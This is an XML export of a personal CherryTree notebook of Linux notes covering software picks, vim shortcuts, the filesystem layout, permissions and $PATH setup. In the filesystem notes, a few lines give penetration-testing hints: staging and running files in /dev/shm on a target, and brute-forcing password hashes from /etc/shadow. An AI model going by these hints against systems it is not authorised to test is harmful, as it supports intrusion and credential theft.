		<node custom_icon_id="0" foreground="" is_bold="False" name="Gaming" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586183759.74" ts_lastsave="1589427405.44" unique_id="193">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="lutris" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586183764.17" ts_lastsave="1589427407.71" unique_id="194">
				<rich_text>program to download &amp; play windows games pre-configured for linux with wine</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="steam" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586183767.29" ts_lastsave="1586183767.29" unique_id="195">
				<rich_text>
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="playonlinux" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589427405.68" ts_lastsave="1589427449.07" unique_id="484">
				<rich_text>similiar to lutris?</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Media Players" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586437430.86" ts_lastsave="1586437436.7" unique_id="281">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Parole" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586437436.78" ts_lastsave="1586437436.78" unique_id="282">
				<rich_text>
</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="RDP" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586183105.58" ts_lastsave="1589606224.26" unique_id="208">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="veyon" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586183108.24" ts_lastsave="1586183108.69" unique_id="209">
				<rich_text>foss
recommended by ctt</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Screenshots" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586184253.07" ts_lastsave="1586184275.19" unique_id="206">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Flameshot" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586184247.28" ts_lastsave="1586184317.11" unique_id="205">
				<rich_text>christitus tech recommends</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="xfce base screenshot tool" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586184275.24" ts_lastsave="1586184302.28" unique_id="207">
				<rich_text>pretty nice.
very much like lightshot but with added 1 extra click everytime.
</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Task Managers" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586713227.24" ts_lastsave="1589168220.89" unique_id="319">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="KSysGuard" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586713343.09" ts_lastsave="1586713358.06" unique_id="321">
				<rich_text>
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="LXTask" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586713358.17" ts_lastsave="1586714200.98" unique_id="322">
				<rich_text>doesnt show network usage
no ram or cpu history
garbo</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Mate System Monitor" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586713332.37" ts_lastsave="1586714170.84" unique_id="320">
				<rich_text>has 3 history graphs
no individual network usage tracking
other than that its quite solid</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="XFCE4 Task Manager" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586713218.45" ts_lastsave="1586713860.36" unique_id="318">
				<rich_text>has cpu and ram history graphs
no network</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="gotop" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589168221.12" ts_lastsave="1589168289.39" unique_id="473">
				<rich_text>perfect terminal tool, but only for monitoring

sudo apt install -y golang
go get github.com/cjbassi/gotop
go run github.com/cjbassi/gotop</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Text Editors" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586176395.27" ts_lastsave="1586876410.15" unique_id="147">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="cherrytree" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586876410.27" ts_lastsave="1589934025.77" unique_id="332">
				<rich_text>ctrl+w select word (buggy, removes capital letters sometimes)
ctrl+r squiggly line seperator
ctrl+t search node names
ctrl+shift+l collapse nodes

ctrl+g uppercase
ctrl+b bold
ctrl+i italic
ctrl+u underlined

cfg file(linux): /home/thmyris/.config/cherrytree/config.cfg</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="gedit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586176405.88" ts_lastsave="1586176405.88" unique_id="190">
				<rich_text>
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="kate" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586176402.05" ts_lastsave="1586176402.05" unique_id="189">
				<rich_text>
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="leafpad" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586183637.19" ts_lastsave="1586183637.19" unique_id="192">
				<rich_text>
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="mousepad" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586176422.06" ts_lastsave="1586176422.06" unique_id="191">
				<rich_text>
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="vim" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570715235.33" ts_lastsave="1591011256.62" unique_id="65">
				<rich_text>if you have any brain
you'd use nano instead</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="-normal mode-" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570715341.37" ts_lastsave="1591019039.18" unique_id="71">
					<rich_text>default mode.
to go back to insert mode
press i or a</rich_text>
					<node custom_icon_id="0" foreground="" is_bold="False" name="v" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591010931.93" ts_lastsave="1591016372.42" unique_id="387">
						<rich_text>select characters</rich_text>
						<node custom_icon_id="0" foreground="" is_bold="False" name="V" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591010940.49" ts_lastsave="1591011015.07" unique_id="579">
							<rich_text>select lines
</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="ctrl+v" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591010946.9" ts_lastsave="1591011017.74" unique_id="580">
							<rich_text>block select</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="y" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591011021.59" ts_lastsave="1591011022.11" unique_id="581">
							<rich_text>copy selection</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="d" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591011029.62" ts_lastsave="1591011038.02" unique_id="582">
							<rich_text>cut selection</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="p" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591011038.4" ts_lastsave="1591011038.89" unique_id="583">
							<rich_text>paste selection</rich_text>
						</node>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="/ [string]" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570715787.58" ts_lastsave="1591010383.29" unique_id="79">
						<rich_text>searches down from where the cursor is
n back search
N forward search</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="? [string]" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570715750.0" ts_lastsave="1591010393.12" unique_id="78">
						<rich_text>searches up from where the cursor is
n back search
N forward search</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="Ctrl + C  V  q" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570717341.8" ts_lastsave="1591010743.62" unique_id="82">
						<rich_text>exits the mode?</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="space" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570717236.27" ts_lastsave="1570893678.18" unique_id="81">
						<rich_text>starts selecting
pressing enter copies the thing you selected
TO buffer_0
you can paste that buffer with prefix -&gt; ] in tmux</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name=":23G" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591010122.6" ts_lastsave="1591010567.45" unique_id="66">
						<rich_text>goes to 23th line</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name=":wq" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570715251.1" ts_lastsave="1591010571.4" unique_id="68">
						<rich_text>write and quit</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name=":!" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570715295.16" ts_lastsave="1591010574.32" unique_id="69">
						<rich_text>forces action</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name=":q" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570715246.61" ts_lastsave="1591010576.63" unique_id="67">
						<rich_text>quit without writing</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="u" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591010655.03" ts_lastsave="1591010655.91" unique_id="70">
						<rich_text>undo</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="ctrl+r" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591010663.11" ts_lastsave="1591010663.86" unique_id="72">
						<rich_text>redo</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="yy" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591010668.76" ts_lastsave="1591010669.77" unique_id="386">
						<rich_text>copy line</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name=":set number" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591010136.26" ts_lastsave="1591016385.82" unique_id="578">
						<rich_text>shows line numbers
</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name=":syntax on" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591016363.59" ts_lastsave="1591016365.9" unique_id="586">
						<rich_text>enables syntax highlighting</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="dd" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591018499.03" ts_lastsave="1591018499.64" unique_id="589">
						<rich_text>delete line</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="-O file1 file2" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591019039.57" ts_lastsave="1591019149.41" unique_id="590">
						<rich_text>opens both files split in vertical manner

To switch between panes:
ctrl+w &amp; arrowkeys || hjkl</rich_text>
					</node>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="-INSERT-" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570715372.35" ts_lastsave="1591010590.41" unique_id="73">
					<rich_text>
</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="-REPLACE-" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570715380.03" ts_lastsave="1591010594.34" unique_id="74">
					<rich_text>
</rich_text>
				</node>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Video Editing" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586183959.32" ts_lastsave="1586183963.57" unique_id="201">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Davinci Resolve" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586184107.16" ts_lastsave="1586184109.06" unique_id="204">
				<rich_text>amd gpus have problems
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="GIMP" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586183967.84" ts_lastsave="1586184107.1" unique_id="203">
				<rich_text>    </rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Kdenlive" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586183963.66" ts_lastsave="1586184160.92" unique_id="202">
				<rich_text>crashes a lot. -_-</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Misc" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589168378.93" ts_lastsave="1589168386.58" unique_id="474">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="neofetch" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589168389.38" ts_lastsave="1589168403.9" unique_id="475">
				<rich_text>sudo apt install neofetch
neofetch</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Terminal Commands" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589934051.19" ts_lastsave="1589934939.96" unique_id="564">
			<rich_text>These are my go to list of terminal software that doesn't usually come pre-installed with distros.
They are probably installed on my /linux.cfg/setup.sh script.



</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="xte" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589934130.78" ts_lastsave="1589934230.06" unique_id="565">
				<rich_text>PART OF: sudo apt install xautomation
xte is a tool that comes with xautomation. Let's you use m&amp;kb with macros.

xte &quot;str Hello World&quot;
xte &quot;key Return&quot;
xte &quot;keydown Control_R&quot;
xte &quot;keyup Control_L&quot;</rich_text>
			</node>
		</node>
	</node>
	<node custom_icon_id="0" foreground="#1aff00" is_bold="True" name="Linux Core" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569055585.56" ts_lastsave="1589946553.26" unique_id="46">
		<rich_text></rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Environment variables " prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586877154.23" ts_lastsave="1586877187.18" unique_id="337">
			<rich_text>Environment variables can also be set pretty easily, just running </rich_text>
			<rich_text family="monospace"> export &lt;varname&gt;=&lt;value&gt;</rich_text>
			<rich_text> will set that as an environment variable

these can also be used as temporary variables (provided you are not overwriting an importan varName)</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="File Structure" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586266601.74" ts_lastsave="1586267300.24" unique_id="140">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="/" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586266621.52" ts_lastsave="1586676521.64" unique_id="210">
				<rich_text>drive root folder</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="bin" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586266782.73" ts_lastsave="1586434429.83" unique_id="211">
					<rich_text>system binary executable files
you shouldn't add anything here</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="boot" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586266823.38" ts_lastsave="1586266910.67" unique_id="212">
					<rich_text>boot files location
(does this include windows-bl? of course not)</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="dev" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586266910.73" ts_lastsave="1591198989.15" unique_id="213">
					<rich_text>These are devices in your system – Not Mounted!</rich_text>
					<node custom_icon_id="0" foreground="" is_bold="False" name="shm" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589588503.31" ts_lastsave="1589936672.08" unique_id="485">
						<rich_text>/dev/shm is nothing but implementation of traditional shared memory concept. It is an efficient means of passing data between programs
Its a neat place to write, execute files on target.</rich_text>
					</node>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="etc" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586268227.53" ts_lastsave="1589875719.88" unique_id="227">
					<rich_text>you come here to customize ALL programs
</rich_text>
					<node custom_icon_id="0" foreground="" is_bold="False" name="group" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586881599.15" ts_lastsave="1586881671.1" unique_id="9">
						<rich_text>The file /etc/group contains all the groups defined in the system
You can use the command &quot;groups&quot; to find all the groups you are a member of

You can use the command newgrp to work as a member a group other than your default group 

You cannot have 2 groups owning the same file.
You do not have nested groups in Linux. One group cannot be sub-group of other
x- eXecuting a directory means Being allowed to &quot;enter&quot; a dir and gain possible access to sub-dirs</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="passwd" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1579248601.46" ts_lastsave="1586881604.29" unique_id="145">
						<rich_text>world readable.
contains all the login information on all the possible “users(groups?)”
passwords -&gt; x means password is shadowed to /etc/shadow
</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="shadow" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1579248751.56" ts_lastsave="1586881606.87" unique_id="146">
						<rich_text>only root and the shadow group can read this file.
! means no password
the passwords here WILL be hashed.
but that means you can bruteforce it :)</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="sudoers" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586888664.66" ts_lastsave="1586888664.66" unique_id="349">
						<rich_text>
</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="skel" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589410342.98" ts_lastsave="1589410364.47" unique_id="478">
						<rich_text>The /etc/skel directory contains  files and directories that are automatically copied over to a new user's  when it is created from useradd command.
backup of dotfiles</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="hosts" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589875720.24" ts_lastsave="1589875720.24" unique_id="558">
						<rich_text></rich_text>
					</node>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="home" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586268047.06" ts_lastsave="1591199027.53" unique_id="224">
					<rich_text>user home folder
/users/thmyris AKA ~ from windows</rich_text>
					<node custom_icon_id="0" foreground="" is_bold="False" name=".bash_history" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586268427.58" ts_lastsave="1586268447.28" unique_id="229">
						<rich_text>ayyyy
</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name=".bash_aliases" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591199027.56" ts_lastsave="1591199043.66" unique_id="80">
						<rich_text>A good way to alias is to add this to ~/.bash_aliases and source to run it in the terminal as the new profile.
Note that .bash_aliases need to be defined in .bashrc for this to work every login.</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name=".bashrc" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586268447.35" ts_lastsave="1586268504.56" unique_id="230">
						<rich_text>lmao</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name=".cache" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586268522.7" ts_lastsave="1586268528.93" unique_id="232">
						<rich_text>is cache</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name=".config" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586268504.63" ts_lastsave="1586268553.96" unique_id="231">
						<rich_text>user spesific config files reside here (supposedly)</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name=".local" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586268554.03" ts_lastsave="1586268750.07" unique_id="233">
						<rich_text>
</rich_text>
						<node custom_icon_id="0" foreground="" is_bold="False" name="share" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586268556.57" ts_lastsave="1586268724.77" unique_id="234">
							<rich_text>User Configuration files for your system. Edit Application in start menu, modify system configurations for your user, etc.</rich_text>
							<node custom_icon_id="0" foreground="" is_bold="False" name="applications" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586268564.82" ts_lastsave="1586268722.37" unique_id="235">
								<rich_text>things installed spesifically for this user only
</rich_text>
							</node>
						</node>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name=".ssh" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586268735.21" ts_lastsave="1586268736.16" unique_id="236">
						<rich_text>ur ssh keys
</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="files" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589588693.92" ts_lastsave="1589588695.35" unique_id="486">
						<rich_text>my personal files section</rich_text>
					</node>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="lib" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586267140.96" ts_lastsave="1586267421.45" unique_id="215">
					<rich_text>Contains shared library files and sometimes other kernel-related files
library files x86
These are not actual folders, they are symlinks → usr/lib
</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="lib64" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586267143.44" ts_lastsave="1586267403.59" unique_id="216">
					<rich_text>Contains shared library files and sometimes other kernel-related files
library files x64
These are not actual folders, they are symlinks → usr/lib</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="lost+found" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586267234.04" ts_lastsave="1586267494.27" unique_id="217">
					<rich_text>recycle bin</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="media" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586267245.64" ts_lastsave="1586437697.24" unique_id="218">
					<rich_text>permenant mount of secondary drives
removable drives also here</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="mnt" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586266977.61" ts_lastsave="1586267140.9" unique_id="214">
					<rich_text>current session mount folder</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="opt" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586676521.67" ts_lastsave="1589937031.07" unique_id="130">
					<rich_text>root write only :(
feel free to put custom scripts here</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="proc" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586267494.33" ts_lastsave="1586267537.34" unique_id="219">
					<rich_text>running procesesses in file format, pretty funny</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="root" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586267537.39" ts_lastsave="1586267582.76" unique_id="220">
					<rich_text>/home of the root USER
typically there is nothing here</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="sbin" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586434429.91" ts_lastsave="1586434435.62" unique_id="271">
					<rich_text family="monospace">Like /bin, this directory holds commands needed to boot the 
    system, but which are usually not executed by normal users.</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="tmp" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586267582.83" ts_lastsave="1586267626.23" unique_id="221">
					<rich_text>basic temp folder
wipes on reboots</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="usr" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586267626.28" ts_lastsave="1589410519.18" unique_id="222">
					<rich_text>NOT USER
&quot;Unix System Resources&quot;
basically system32 of linux
you never need to touch this.
its a very stupid folder with the same strucuture as the drive root folder
ELI5 its basically there to confuse people, dont touch</rich_text>
					<node custom_icon_id="0" foreground="" is_bold="False" name="bin" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586434552.41" ts_lastsave="1586434554.98" unique_id="273">
						<rich_text>/usr/bin
    This is the primary directory for executable programs. Most
    programs executed by normal users which are not needed for 
    booting or for repairing the system and which are not
    installed locally should be placed in this directory.</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="local" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586434530.09" ts_lastsave="1586434531.38" unique_id="272">
						<rich_text family="monospace">/usr/local
    This is where programs which are local to the site typically
    go.

/usr/local/bin
    Binaries for programs local to the site.

/usr/local/sbin
    Locally installed programs for system administration.</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="share" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589410519.42" ts_lastsave="1589602610.16" unique_id="479">
						<rich_text>
</rich_text>
						<node custom_icon_id="0" foreground="" is_bold="False" name="kali-defaults" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589410525.31" ts_lastsave="1589410545.22" unique_id="480">
							<rich_text>.bashrc backup</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="wordlists" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589602610.4" ts_lastsave="1589602612.73" unique_id="493">
							<rich_text>folder for an infinite amount of words (on kali)</rich_text>
						</node>
					</node>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="var" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586267772.49" ts_lastsave="1586888758.99" unique_id="223">
					<rich_text>this folder stores variables of the system
</rich_text>
					<rich_text weight="heavy">The Linux miscellaneous directory, a myriad of processes store data in /var</rich_text>
					<rich_text>
</rich_text>
					<node custom_icon_id="0" foreground="" is_bold="False" name="local" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586268241.7" ts_lastsave="1586268243.83" unique_id="228">
						<rich_text>u put some shit here idk</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="log" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586268121.65" ts_lastsave="1586268122.43" unique_id="225">
						<rich_text>log folder for ALL the error logs (supposedly)</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="www" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586268184.2" ts_lastsave="1586268225.15" unique_id="226">
						<rich_text>website server files location
apache 
lampstack
</rich_text>
					</node>
				</node>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Permissions" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586877974.2" ts_lastsave="1589864806.85" unique_id="339">
			<rich_text>These attributes are(in order) the file 
permissions | owner of the file | and group that the file is in.
-rwxr-xr-x        root                        root


READ, WRITE, EXECUTE
  r     w       x
  1     1       1



Every file and directory on your Unix/Linux system is assigned 3 types of owner, given below:

User
A user is the owner of the file. By default, the person who created a file becomes its owner. Hence, a user is also sometimes called an owner.
Group
A user- group can contain multiple users. All users belonging to a group will have the same access permissions to the file. Suppose you have a project where a number of people require access to a file. Instead of manually assigning permissions to each user, you could add all users to a group, and assign group permission to file such that only this group members and no one else can read or modify the files.
Other
Any other user who has access to a file. This person has neither created the file, nor he belongs to a usergroup who could own the file. Practically, it means everybody else. Hence, when you set the permission for others, it is also referred as set permissions for the world.

chmod USER, GROUP, WORLD(official name= others)
chmod   3     4      1   
       011   100    001
=      -wx   r--    --x


Operator	Description
+	        Adds a permission to a file or directory
-	        Removes the permission
=	        Sets the permission and overrides the permissions set earlier.

User Denotations
u	 user/owner
g	 group
o	 other
a	 all

Example:
chmod u-r file # removes read from user

for suid see. Pentesting

</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="summary" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586881750.34" ts_lastsave="1586881750.93" unique_id="341">
				<rich_text>• Linux being a multi-user system uses permissions and ownership for security.
• There are three user types on a Linux system viz. User, Group and Other
• Linux divides the file permissions into read, write and execute denoted by r,w, and x
• The permissions on a file can be changed by 'chmod' command which can be further divided into Absolute and Symbolic mode
• The 'chown' command can change the ownership of a file/directory. Use the following commands: chown user file or chown user:group file
• The 'chgrp' command can change the group ownership chrgrp group filename
• What does x - eXecuting a directory mean? A: Being allowed to &quot;enter&quot; a dir and gain possible access to sub-dirs.
</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Shortcuts" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569055593.89" ts_lastsave="1586877950.68" unique_id="47">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Ctrl + Alt + FKEY" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569055614.15" ts_lastsave="1569055646.63" unique_id="48">
				<rich_text>tty-terminal</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="sudo" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586885066.89" ts_lastsave="1586885066.89" unique_id="344">
			<rich_text>
</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="$PATH" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588957201.95" ts_lastsave="1589428137.17" unique_id="471">
			<rich_text>PATH=$PATH:/my/new/path
add a path for the current session

perma add path:
tee -a ~/.profile &gt; /dev/null &lt;&lt;EOT
export PATH=&quot;$PATH:/snap/bin&quot;
EOT

Extra info:
# 27) add to $PATH
# 
# The following command adds a path to your current path:
# 
# export PATH=&quot;$PATH:/my/custom/path&quot;
# 
# If you want your setup to execute this command every time, there are a number of places where you can put it. When you login, the following scripts will be executed in this order:
# 
# /etc/profile      (which starts by loading everything in /etc/profile.d)
# ~/.profile        (which starts by loading ~/.bashrc if you are running bash)
# 
# Notes
# 
#     ~/.profile is only loaded if ~/.bash_profile and ~/.bash_login DO NOT EXIST. Otherwise, at least bash, will load them instead. It is advisable to use .profile and not the bash specific scripts. So, if in these attempts you created .bash_login, please delete it now.
# 
#     ~/.bashrc is only loaded if you are running an interactive session. (something with a prompt where you can actually type something).
# 
